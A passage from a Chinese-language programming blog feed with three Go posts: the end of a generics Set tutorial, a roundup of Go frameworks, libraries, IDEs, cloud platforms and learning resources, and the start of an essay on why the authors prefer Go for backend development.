<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">// A union B</span></span><br><span class="line">func (<span class="selector-tag">a</span> Set<span class="selector-attr">[T]</span>) <span class="built_in">Union</span>(<span class="selector-tag">b</span> Set<span class="selector-attr">[T]</span>) Set<span class="selector-attr">[T]</span> &#123;</span><br><span class="line">    small, large := <span class="built_in">smallLarge</span>(<span class="selector-tag">a</span>, b)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> key := range small &#123;</span><br><span class="line">        large<span class="selector-class">.Add</span>(key)</span><br><span class="line">    &#125;</span><br><span class="line">    return large</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A intersect B</span></span><br><span class="line">func (<span class="selector-tag">a</span> Set<span class="selector-attr">[T]</span>) <span class="built_in">Intersection</span>(<span class="selector-tag">b</span> Set<span class="selector-attr">[T]</span>) Set<span class="selector-attr">[T]</span> &#123;</span><br><span class="line">    small, large := <span class="built_in">smallLarge</span>(<span class="selector-tag">a</span>, b)</span><br><span class="line">    </span><br><span class="line">    resultSet := NewSet<span class="selector-attr">[T]</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> key := range small &#123;</span><br><span class="line">        <span class="keyword">if</span> large<span class="selector-class">.Contains</span>(key) &#123;</span><br><span class="line">            resultSet<span class="selector-class">.Add</span>(key)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return resultSet</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// returns the small and large sets according to their len</span></span><br><span class="line">func smallLarge<span class="selector-attr">[T comparable]</span>(<span class="selector-tag">a</span>, <span class="selector-tag">b</span> Set<span class="selector-attr">[T]</span>) (Set<span class="selector-attr">[T]</span>, Set<span class="selector-attr">[T]</span>) &#123;</span><br><span class="line">    small, large := <span class="selector-tag">b</span>, <span class="selector-tag">a</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b) &gt; <span class="built_in">len</span>(a) &#123;</span><br><span class="line">        small, large = <span class="selector-tag">a</span>, <span class="selector-tag">b</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return small, large</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两种方法都相当简单。在中，<code>Union</code> 我们只是迭代一个集合，将值添加到另一个集合。在中，<code>Intersection</code> 我们正在检查中的值 <code>A</code> 是否也在中，<code>B</code> 并返回一个仅包含两者中的元素的集合。</p>
<p>优化来自区分哪个集合是 <code>smallLarge(a, b)</code> 调用中较小的集合。通过这样做，我们允许循环只迭代两个集合中较小的一个。如果一个 Set 很大而另一个很小，这可能会节省很多迭代。</p>
<blockquote>
<p>但是，在 <strong>Union</strong> 中，我们正在覆盖可能是 <strong>A</strong> 或 <strong>B</strong> 的大集合。如果我们想在合并时保留原始集合，我们将不得不循环遍历两个集合。</p>
</blockquote>
<p>我们现在有一个功能齐全的 Set 包。通过更多的工作，我们可以为切片添加帮助器并添加更多实用方法，例如检查是否相等。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">// A == B (all elements of A are in B and vice versa)</span></span><br><span class="line">func (<span class="selector-tag">a</span> Set<span class="selector-attr">[T]</span>) <span class="built_in">Equals</span>(<span class="selector-tag">b</span> Set<span class="selector-attr">[T]</span>) bool &#123;</span><br><span class="line">    return <span class="built_in">len</span>(<span class="selector-tag">a</span><span class="selector-class">.Difference</span>(b)) == <span class="number">0</span> &amp;&amp; <span class="built_in">len</span>(<span class="selector-tag">b</span><span class="selector-class">.Difference</span>(a)) == <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a Set from a slice.</span></span><br><span class="line">func SliceToSet<span class="selector-attr">[T comparable]</span>(s <span class="selector-attr">[]</span>T) Set<span class="selector-attr">[T]</span> &#123;</span><br><span class="line">   set := NewSet<span class="selector-attr">[T]</span>(<span class="built_in">len</span>(s))</span><br><span class="line">   <span class="keyword">for</span> _, item := range s &#123;</span><br><span class="line">       set<span class="selector-class">.Add</span>(item)</span><br><span class="line">   &#125;</span><br><span class="line">   return set</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Union two slices. The provided slices do not need to be unique. Order not guaranteed.</span></span><br><span class="line">func SliceUnion<span class="selector-attr">[T comparable]</span>(<span class="selector-tag">a</span>, <span class="selector-tag">b</span> <span class="selector-attr">[]</span>T) <span class="selector-attr">[]</span>T &#123;</span><br><span class="line">   aSet, bSet := <span class="built_in">SliceToSet</span>(a), <span class="built_in">SliceToSet</span>(b)</span><br><span class="line">   union := aSet<span class="selector-class">.Union</span>(bSet)</span><br><span class="line">   return union<span class="selector-class">.ToSlice</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Intersection of two slices. The provided slices do not need to be unique. Order not guaranteed.</span></span><br><span class="line">func SliceIntersection<span class="selector-attr">[T comparable]</span>(<span class="selector-tag">a</span>, <span class="selector-tag">b</span> <span class="selector-attr">[]</span>T) <span class="selector-attr">[]</span>T &#123;</span><br><span class="line">   aSet, bSet := <span class="built_in">SliceToSet</span>(a), <span class="built_in">SliceToSet</span>(b)</span><br><span class="line">   intersection := aSet<span class="selector-class">.Intersection</span>(bSet)</span><br><span class="line">   return intersection<span class="selector-class">.ToSlice</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过以上所有工作，我们能够执行如下所示的操作：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">func <span class="built_in">TestSets</span>(t *testing.T) &#123;</span><br><span class="line">   A := <span class="built_in">SliceToSet</span>(<span class="selector-attr">[]</span>int&#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>&#125;)</span><br><span class="line">   B := <span class="built_in">SliceToSet</span>(<span class="selector-attr">[]</span>int&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;)</span><br><span class="line">  </span><br><span class="line">   union := A<span class="selector-class">.Union</span>(B)</span><br><span class="line">   fmt<span class="selector-class">.Println</span>(union) <span class="comment">// map[0:true 1:true 2:true 3:true 4:true 5:true]</span></span><br><span class="line">  </span><br><span class="line">   C := <span class="built_in">SliceToSet</span>(<span class="selector-attr">[]</span>string&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;noah&quot;</span>&#125;)</span><br><span class="line">   D := <span class="built_in">SliceToSet</span>(<span class="selector-attr">[]</span>string&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;noah&quot;</span>&#125;)</span><br><span class="line">   intersection := C<span class="selector-class">.Intersection</span>(D)</span><br><span class="line">   fmt<span class="selector-class">.Println</span>(intersection) <span class="comment">// map[a:true noah:true]</span></span><br><span class="line">  </span><br><span class="line">   fmt<span class="selector-class">.Println</span>(C<span class="selector-class">.Equals</span>(D)) <span class="comment">// false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我希望你发现这篇文章有帮助！同样，所有代码都可以在 GitHub 上找到。</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpdHNsYWdnYS9nby1ydXN0LWV4YW1wbGUvdHJlZS9tYXN0ZXIvZ28tZ2VuZXJpY3M=">https://github.com/gitslagga/go-rust-example/tree/master/go-generics<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
  </entry>
  <entry>
    <title>Go 语言指南：框架、库、IDE、云、资源、导师</title>
    <url>/2022/12/go-library/</url>
    <content><![CDATA[<h2 id="你的-Go-语言纲要"><a href="#你的-Go-语言纲要" class="headerlink" title="你的 Go 语言纲要"></a>你的 Go 语言纲要</h2><p>Go 是 Google 于 2009 年创建的一种编程语言，它是一种语法类似于 C 的静态类型语言，专为高性能和并发编程而设计。Go 通常用于构建 Web 应用程序、分布式系统和其他类型的软件。</p>
<p>Go 语言的一些强项是：</p>
<span id="more"></span>

<ul>
<li>易于学习和使用 - Go 具有简单明了的语法，易于学习和理解。</li>
<li>高性能 - Go 是一种编译语言，可以生成快速高效的代码。</li>
<li>可扩展性和并发性 - Go 内置了对并发性和并行性的支持，这使其能够处理大量工作负载并轻松扩展。</li>
<li>健壮的标准库 - Go 有一个全面的标准库，为开发应用程序提供了广泛的特性和功能。</li>
<li>强大的社区 - Go 拥有庞大而活跃的开发人员社区，他们为语言及其生态系统做出贡献，为用户提供支持、工具和资源。</li>
</ul>
<h1 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h1><p>一些最著名的 Go 语言框架是：</p>
<p><strong>Gin</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naW4tZ29uaWMuY29tLw==">Gin<i class="fa fa-external-link-alt"></i></span>是一个用于构建 API 和微服务的 Web 框架。它速度快、轻量级，并为开发 Web 应用程序提供了简单直接的 API。</p>
<p><strong>Beego</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iZWVnby52aXAv">Beego<i class="fa fa-external-link-alt"></i></span>是一个用于构建 Web 应用程序和服务的全栈 Web 框架。它提供了一系列功能和工具，用于快速轻松地开发 Web 应用程序。</p>
<p><strong>Echo</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9lY2hvLmxhYnN0YWNrLmNvbS8=">Echo<i class="fa fa-external-link-alt"></i></span>是一个用于构建 API 和 Web 应用程序的高性能 Web 框架。它提供了一个快速灵活的 API，用于以最小的开销开发 Web 应用程序。</p>
<p><strong>Buffalo</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9nb2J1ZmZhbG8uaW8vIw==">Buffalo<i class="fa fa-external-link-alt"></i></span>是一个用于构建 Web 应用程序和服务的全栈 Web 开发框架。它提供了一系列用于使用 Go 开发 Web 应用程序的工具和功能。</p>
<p><strong>Revel</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9yZXZlbC5naXRodWIuaW8v">Revel<i class="fa fa-external-link-alt"></i></span>是用于构建 API 和 Web 应用程序的高性能 Web 框架。它为使用 Go 开发 Web 应用程序提供了一个简单而灵活的 API。</p>
<h1 id="库"><a href="#库" class="headerlink" title="库"></a>库</h1><p>一些最流行的 Go 库是：</p>
<p><strong>Go-Redis</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvLXJlZGlzL3JlZGlz">Go-Redis<i class="fa fa-external-link-alt"></i></span>是一个用于 Go 的 Redis 客户端库，它提供了一个简单直接的 API，用于在 Go 中使用 Redis。</p>
<p><strong>Gorm</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9nb3JtLmlvLw==">Gorm<i class="fa fa-external-link-alt"></i></span>是 Go 的 ORM（对象关系映射）库，它提供了一个简单而优雅的 API，用于在 Go 中处理数据库。</p>
<p><strong>Gorilla Mux</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvcmlsbGEvbXV4">Gorilla Mux<i class="fa fa-external-link-alt"></i></span>是一个强大的 Go URL 路由器和调度程序，它提供了一个灵活直观的 API，用于在 Web 应用程序中路由 HTTP 请求。</p>
<p><strong>Go-SQLite3</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hdHRuL2dvLXNxbGl0ZTM=">Go-SQLite3<i class="fa fa-external-link-alt"></i></span>是一个用于 Go 的 SQLite3 驱动程序库，它提供了一个简单直接的 API，用于使用 Go 中的 SQLite3 数据库。</p>
<p><strong>Go-Protobuf</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvbGFuZy9wcm90b2J1Zg==">Go-Protobuf<i class="fa fa-external-link-alt"></i></span>是 Go 的 Protocol Buffers 库，它提供了一个简单直接的 API，用于在 Go 中编码和解码 Protocol Buffers 消息。</p>
<h1 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h1><p>一些流行的 Go 语言 IDE 是：</p>
<p><strong>GoLand</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamV0YnJhaW5zLmNvbS9nby8=">GoLand<i class="fa fa-external-link-alt"></i></span>是由 JetBrains 开发的专用 Go 语言 IDE。它提供了一系列用于开发和调试 Go 应用程序的功能和工具，包括代码完成、重构和错误检测。</p>
<p><strong>Visual Studio Code</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20v">Visual Studio Code<i class="fa fa-external-link-alt"></i></span>是一种流行的开源代码编辑器，通过其 Go 扩展支持 Go 开发。它为开发 Go 应用程序提供了一系列功能，包括代码完成、linting 和调试。</p>
<p><strong>Sublime Text</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc3VibGltZXRleHQuY29tLw==">Sublime Text<i class="fa fa-external-link-alt"></i></span>是一种流行的文本编辑器，通过其 GoSublime 包支持 Go 开发。它为开发 Go 应用程序提供了一系列功能，包括代码完成、linting 和调试。</p>
<p><strong>Vim</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudmltLm9yZy8=">Vim<i class="fa fa-external-link-alt"></i></span>是一种流行的文本编辑器，通过其 vim-go 插件支持 Go 开发。它为开发 Go 应用程序提供了一系列功能，包括代码完成、linting 和调试。</p>
<h1 id="云"><a href="#云" class="headerlink" title="云"></a>云</h1><p>许多云提供商支持 Go 语言，包括：</p>
<p><strong>Amazon Web Services</strong></p>
<p>AWS 提供一系列服务和工具，用于在其云平台上开发和部署 Go 应用程序，包括 Elastic Beanstalk、EC2 和 Lambda。</p>
<p><strong>Microsoft Azure</strong></p>
<p>Azure 提供了一系列服务和工具，用于在其云平台上开发和部署 Go 应用程序，包括 App Service、Functions 和 Kubernetes。</p>
<p><strong>Google Cloud Platform</strong></p>
<p>GCP 提供一系列服务和工具，用于在其云平台上开发和部署 Go 应用程序，包括 App Engine、Compute Engine 和 Kubernetes Engine。</p>
<p><strong>Heroku</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaGVyb2t1LmNvbS8=">Heroku<i class="fa fa-external-link-alt"></i></span>是一个云平台，通过其 Cedar-14 堆栈为 Go 应用程序提供支持。它提供了一种在云上部署和管理 Go 应用程序的简单直接的方法。</p>
<p><strong>DigitalOcean</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGlnaXRhbG9jZWFuLmNvbS8=">DigitalOcean<i class="fa fa-external-link-alt"></i></span>提供一系列服务和工具，用于在其云平台上开发和部署 Go 应用程序，包括 Droplets、Kubernetes 和 App Platform。</p>
<h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><p>一些学习 Go 语言的最佳网站是：</p>
<p><strong>Go by Example</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9nb2J5ZXhhbXBsZS5jb20v">Go by Example<i class="fa fa-external-link-alt"></i></span>是一个提供一系列 Go 语言示例和教程的网站。它涵盖了广泛的主题，并具有可在浏览器中编辑和执行的交互式代码示例。</p>
<p><strong>Go Tour</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9nby5kZXYvdG91ci93ZWxjb21lLzE=">Go Tour<i class="fa fa-external-link-alt"></i></span>是一个交互式网站，介绍了 Go 语言的概念和功能。它包括一系列练习和测验，可以帮助用户以有趣和引人入胜的方式学习 Go 语言。</p>
<p><strong>GoDoc</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9nby5kZXYvZG9jLw==">GoDoc<i class="fa fa-external-link-alt"></i></span>是一个为 Go 语言及其标准库提供全面文档的网站。它包括对 Go 语言概念和特性的详细解释、示例和参考资料。</p>
<p><strong>The Go Programming Language</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29wbC5pby8=">Go Programming Language<i class="fa fa-external-link-alt"></i></span>是 Alan AA Donovan 和 Brian W. Kernighan 合着的一本书，全面介绍了 Go 语言的概念和特性。它在网络上免费提供，可以成为学习 Go 语言的绝佳资源。</p>
<p><strong>Go Blog</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9nby5kZXYvYmxvZy8=">Go Blog<i class="fa fa-external-link-alt"></i></span>是 Go 语言团队的官方博客。它包含一系列文章、教程和资源，可以帮助用户学习 Go 语言并了解该语言及其生态系统的最新发展。</p>
<p><strong>Golang 导航</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9oYW8uc3R1ZHlnb2xhbmcuY29tLw==">Golang 导航<i class="fa fa-external-link-alt"></i></span>是国内 Go 语言社区内比较有名的导航网站，收集了国内一些大佬的优秀学习资源，当然也有一些不知名的优秀学习资源，不一一涵盖。</p>
<h1 id="导师"><a href="#导师" class="headerlink" title="导师"></a>导师</h1><p>一些最著名的 Go 语言程序员是：</p>
<p><strong>Rob Pike</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9lbi5tLndpa2lwZWRpYS5vcmcvd2lraS9Sb2JfUGlrZQ==">Rob Pike<i class="fa fa-external-link-alt"></i></span>是 Go 语言的共同创造者之一，也是 Google Go 语言团队的前成员。他还是 The Go Programming Language 一书的合著者，也是 Go 社区的知名人物。</p>
<p><strong>Russ Cox</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zd3RjaC5jb20vfnJzYy8=">Russ Cox<i class="fa fa-external-link-alt"></i></span>是 Google Go 语言团队的前成员，现任软件自由保护协会的研究主管。他为 Go 语言及其生态系统做出了重大贡献，包括 Go 构建工具的开发。</p>
<p><strong>Ian Lance Taylor</strong></p>
<p>Ian Lance Taylor 是 Google Go 语言团队的前成员，也是 Go in Practice 一书的作者。他是 Go 社区的知名人物，为 Go 语言及其生态系统做出了重大贡献。</p>
<p><strong>Dave Cheney</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kYXZlLmNoZW5leS5uZXQv">Dave Cheney<i class="fa fa-external-link-alt"></i></span>是 Go 社区的知名人物，也是 Go Proverbs 博客的作者。他为 Go 语言及其生态系统做出了重大贡献，包括开发流行的 Go 库和工具。</p>
<p><strong>Mat Ryer</strong></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BtYXRyeWVy">Mat Ryer<i class="fa fa-external-link-alt"></i></span>是 Go 社区的知名人物，也是 GoBridge 和 GoLearn 组织的创始人。他为 Go 语言及其生态系统做出了重大贡献，包括开发流行的 Go 库和工具。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
  </entry>
  <entry>
    <title>为什么我们更喜欢 Go 作为后端</title>
    <url>/2022/12/go-prefer/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>那里有大量的后端编程语言。他们在不同情况下都有各自的优势。例如<em>Java</em>非常适合企业后端，<em>Typescript</em> + <em>NodeJS</em> 对全栈开发很有用。还有 <em>PHP</em> 和 <em>Ruby</em>，它们……我不知道您为什么要选择它们，但我想它们各自适用。</p>
<p>但在我们这边，只要有可能，我们更喜欢 <em>Go</em>，因为它在执行速度、开发速度和其坚持已见的哲学之间取得了平衡，这导致了更标准化的代码，从而更好的编码实践。</p>
<span id="more"></span>

<p>就像我们心爱的语言一样，我们也很固执己见。因此，事不宜迟，让我们开始探讨为什么我们更喜欢 <em>Go</em>。</p>
<h1 id="性能与开发时间"><a href="#性能与开发时间" class="headerlink" title="性能与开发时间"></a>性能与开发时间</h1><p>我们发现 <em>Go</em> 在性能和开发时间之间取得了最佳平衡。这是由许多因素造成的，我们将立即讨论其中的一些因素。</p>
<h2 id="小语法"><a href="#小语法" class="headerlink" title="小语法"></a>小语法</h2><p>每一个 <em>Go</em> 的辩护者通常都会反驳这一点，所以让我们把它放在一边吧。go 具有最小的关键字集之一和简单的语法这一事实很棒。这意味着您可以将大部分时间用于学习如何使用该语言，而不必花时间学习该语言。</p>
<h2 id="完善的标准库"><a href="#完善的标准库" class="headerlink" title="完善的标准库"></a>完善的标准库</h2><p>这一点是双重的，首先，几乎所有你需要的关于 web 服务器的基本东西都在标准库中，所以你真的不必浪费那么多时间寻找一个可以满足你需要的包。</p>
<p>说到这里，第二点来了。无论是依赖管理、linter、测试框架、基准测试工具、竞争检测器，甚至更多，都包含在 <code>go</code> CLI 工具中。甚至还有一个标准格式化程序 <em>gofmt</em>。这意味着您不必考虑使用哪个包管理器、您将选择哪种 linter 和样式、哪种测试框架等。一切就在那里，您可以立即开始编码，所有代码看起来是一体的。</p>
<p>说到这里，这与我们的下一点有关。</p>
<h2 id="固执己见"><a href="#固执己见" class="headerlink" title="固执己见"></a>固执己见</h2><p>编译器和 linter 非常令人讨厌，这听起来像是一件坏事，但我们发现它实际上恰恰相反。例如错误处理。假设我们有以下代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> foobar</span><br><span class="line"><span class="keyword">type</span> myInterface <span class="keyword">interface</span>&#123;</span><br><span class="line">    Foo() (<span class="type">int</span>, <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Bar</span><span class="params">(i myInterface)</span></span>&#123;</span><br><span class="line">    result, err := i.Foo()</span><br><span class="line">    fmt.Println(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这不会编译，因为 <code>err</code> 变量已定义但从未使用过。为了编译它，您必须使用变量，例如：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">func <span class="built_in">Bar</span>(i myInterface)&#123;</span><br><span class="line">    result, err := i.<span class="built_in">Foo</span>()</span><br><span class="line">    if err != nil&#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt<span class="selector-class">.Println</span>(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者更积极地选择用 <code>_</code>，而不是名称来忽略它：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">func <span class="built_in">Bar</span>(<span class="selector-tag">i</span> myInterface)&#123;</span><br><span class="line">    result, _ := <span class="selector-tag">i</span><span class="selector-class">.Foo</span>()</span><br><span class="line">    fmt<span class="selector-class">.Println</span>(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译器的不断唠叨可能看起来微不足道，但它会帮助您缩短代码，从而更易于阅读，更重要的是，它会通过强制执行正确的错误处理来生成更稳定的代码。稍后我们将深入探讨这一点</p>
<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p>对于大多数 <em>node</em>、<em>Java</em> 等开发人员来说，这将是一个陌生的或不相关的概念。但是当谈到速度时，能够使用栈内存而不是在堆中分配内存会产生巨大的差异。虽然您没有像在 <em>C</em> 和 <em>C++</em> 中那样精细的控制，但您确实有一定程度的控制。如果不使用指针，则不会分配内存，而如果使用，则可能会分配内存。</p>
<p><em><strong>“等等，你是说指针吗？！”</strong></em></p>
<p>是的，但不用担心，您不需要 <code>malloc</code> 也不需要 <code>free</code> 。事实上，您使用的大多数语言都有指针。让我们想想 <em>Java</em> 和 <em>C#<em>，在它们中，类的每个实例实际上都是指向对象的指针，这就是为什么您可能会听到对象是“按引用传递”的原因，这实际上不是真的，您只是传递了一个副本指向对象的指针。</em>Go</em> 的不同之处在于你是选择它是否是指针的人，但就像那些语言一样，分配的内存由垃圾收集器释放。</p>
<p><em><strong>垃圾收集</strong></em></p>
<p><em>Go</em> 是垃圾回收的，所以你可能认为它是 <em>C</em> 和 <em>Java</em> 在内存管理方面的中间点。您有一些控制权，但是您将所有困难的部分留给了垃圾收集器。老实说，这一直是争论的焦点。<em>Go</em> 的垃圾收集器并不总是很棒，虽然现在很棒，但我们仍然相信内存管理的好处超过了更好的垃圾收集系统的好处，因为在大多数程序中你不会使用 <em>那么多的</em> 内存分配。在大多数应用程序中，任何类型的垃圾收集都胜过手动内存管理的好处。</p>
<h2 id="很棒的打字系统"><a href="#很棒的打字系统" class="headerlink" title="很棒的打字系统"></a>很棒的打字系统</h2><p>在我们看来，拥有强静态类型语言是没有商量余地的。看起来每个人都认为他们永远不会以使用错误类型这样明显的方式犯错误，但那是 <code>bull$#!%</code>。你总是会有糟糕的一天，或者你的 PM 在周五要求你写一个快速的功能，而你只是半途而废。拥有一个好的打字系统可以避免这些错误。</p>
<p>最重要的是，我们实际上非常喜欢 <em>Go</em> 的类型系统。能够只在你需要的地方定义接口，而不是让一个类实现所有都是该类子集的接口负载，这有助于遵守 ISP</p>
<h2 id="面向对象，但不是全部"><a href="#面向对象，但不是全部" class="headerlink" title="面向对象，但不是全部"></a>面向对象，但不是全部</h2><p>在 OOP 中，人们常说使用组合而不是继承。事实上，根据 Alan Kay（OOP 之父）的说法，它甚至不是定义的必要部分。根据 SmallTalk 的早期版本</p>
<ul>
<li>对象通过发送和接收消息进行通信。</li>
<li>对象有自己的记忆。</li>
<li>每个对象都是一个类的实例。</li>
<li>该类持有其实例的共享行为</li>
</ul>
<p>在这个对象和类的定义中，并没有提到继承。然而，在实践中很少出现这种情况。不仅语言在语法方面更喜欢继承而不是组合，而且大多数模式都是用继承建模的。<br>老实说，里氏代换原则 (LSP) 很棒。但是你真的不需要 LSP 的继承。因此，如果您可以通过组合而不是继承来达到类似的效果，那就太好了。</p>
<p>好的，那么 <em>Go</em> 是从哪里进入这一点的呢？在 <em>go</em> 中没有结构之间的继承这样的东西，但是有一种使用组合、嵌入的惊人方法。如果你使用接口，你可以毫不费力地遵循 LSP。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> A <span class="keyword">struct</span>&#123;</span><br><span class="line">    n <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *A)</span></span> SetNum(<span class="type">int</span> n)&#123;</span><br><span class="line">    a.n = n</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *A)</span></span> String() <span class="type">string</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;A: %d&quot;</span>, n)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> B <span class="keyword">struct</span>&#123;</span><br><span class="line">    *A</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们有<code>A</code>嵌入在 struct 中的结构<code>B</code>。那么……它有什么作用？好吧，我们现在已经定义了<code>A</code>可以从<code>B</code>对象访问的每个方法。像这样：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">func <span class="selector-tag">main</span>()&#123;</span><br><span class="line">    <span class="selector-tag">b</span> := &amp;B&#123;&amp;<span class="selector-tag">A</span>&#123;&#125;&#125;</span><br><span class="line">    <span class="selector-tag">b</span><span class="selector-class">.SetNum</span>(<span class="number">4</span>)</span><br><span class="line">    fmt<span class="selector-class">.Println</span>(<span class="selector-tag">b</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这将打印 <code>A: 4</code></p>
<p>等等，这不就是多了几个步骤的继承吗？</p>
<p>一点都不。这是彻头彻尾的构图。这只是语言给我们的一种便利，这样我们就不需要编写除了调用另一个方法之外什么都不做的方法。事实上，当我们调用时，<code>b.SetNum(4)</code> 它实际上是在调用 <code>b.A.SetNum(4)</code>. 所以我们实际上是在修改 <code>A</code> 对象而不是 <code>b</code>。</p>
<p>我们可以看到，如果我们添加到<code>B</code>具有相同名称的方法，我们仍然可以访问<code>A</code>的方法，并且两个对象不会相互影响。像这样：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">type B struct &#123;</span><br><span class="line">    *A</span><br><span class="line">    n int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (<span class="selector-tag">b</span> *B) <span class="built_in">SetNum</span>(n int) &#123;</span><br><span class="line">    <span class="selector-tag">b</span><span class="selector-class">.n</span> = n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (<span class="selector-tag">b</span> *B) <span class="built_in">String</span>() string &#123;</span><br><span class="line">    return fmt<span class="selector-class">.Sprintf</span>(<span class="string">&quot;B: %d, A:%d&quot;</span>, <span class="selector-tag">b</span><span class="selector-class">.n</span>, <span class="selector-tag">b</span><span class="selector-class">.A</span>.n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="selector-tag">main</span>()&#123;</span><br><span class="line">    <span class="selector-tag">b</span> := &amp;B&#123;A:&amp;A&#123;&#125;&#125;</span><br><span class="line">    <span class="selector-tag">b</span><span class="selector-class">.A</span><span class="selector-class">.SetNum</span>(<span class="number">5</span>)   <span class="comment">//the A object is still accessible</span></span><br><span class="line">    <span class="selector-tag">b</span><span class="selector-class">.SetNum</span>(<span class="number">4</span>)     <span class="comment">//we are accessing the b object</span></span><br><span class="line">    fmt<span class="selector-class">.Println</span>(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这将打印 <code>B:4, A:5</code></p>
<p>这样我们就可以遵守 LSP 而无需处理那个讨厌的继承。</p>
<h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><p>让我们回到错误处理。软件开发中最困难的事情之一（除了命名和缓存失效）是如何处理不成功的函数调用。有两种处理方法，一种是通过异常处理，另一种是通过错误处理。异常处理是常态，但最近新的语言（例如 <em>Go</em> 和 <em>Rust</em>）选择了后者。</p>
<p>但为什么？在异常处理中，您只在需要时才处理异常。这意味着您通常不会处理它，因为显然您永远不会将错误编程到您的代码库中，所以何必费心呢？或者你可能会做一些包罗万象的异常处理，只是因为没有考虑可能发生的事情。</p>
